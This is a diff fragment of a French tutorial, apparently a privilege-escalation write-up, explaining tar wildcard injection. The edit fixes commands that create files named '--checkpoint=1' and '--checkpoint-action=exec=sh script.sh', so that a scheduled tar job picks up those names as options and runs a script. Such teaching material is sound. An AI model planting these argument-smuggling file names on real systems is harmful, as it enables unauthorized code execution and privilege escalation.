@@ -201,11 +201,11 @@ Le processus d'exploitation se fait comme suit :
 
 2- Créer un fichier vide nommé `--checkpoint=1`
 ```
-echo ""  --checkpoint=1
+echo "" > --checkpoint=1
 ```
 3- Créer un fichier vide nommé `"--checkpoint-action=exec=sh script.sh"`
 ```
-echo ""  "--checkpoint-action=exec=sh script.sh"
+echo "" > "--checkpoint-action=exec=sh script.sh"
 ```
 
 Ensuite on attend une minute que notre script soit exécuté
